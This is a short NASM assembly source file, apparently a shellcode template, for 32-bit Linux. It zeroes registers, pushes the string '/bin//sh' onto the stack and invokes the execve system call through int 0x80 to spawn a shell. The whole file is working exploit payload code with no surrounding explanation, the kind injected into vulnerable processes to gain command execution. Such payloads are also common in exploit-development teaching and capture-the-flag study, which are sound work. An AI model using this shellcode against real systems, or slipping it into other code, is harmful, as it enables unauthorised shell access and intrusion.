        ;; ECX or EAX must be cleared upon entry
[BITS 32]
        %include "linux/32.asm"

        ;; Clear eax, ecx, edx
	      imul ecx

        ;; Push '/bin//sh'
        push eax
        push `//sh`
        push `/bin`

        ;; Call execve
        mov al, SYS_execve
        mov ebx, esp
        int 0x80
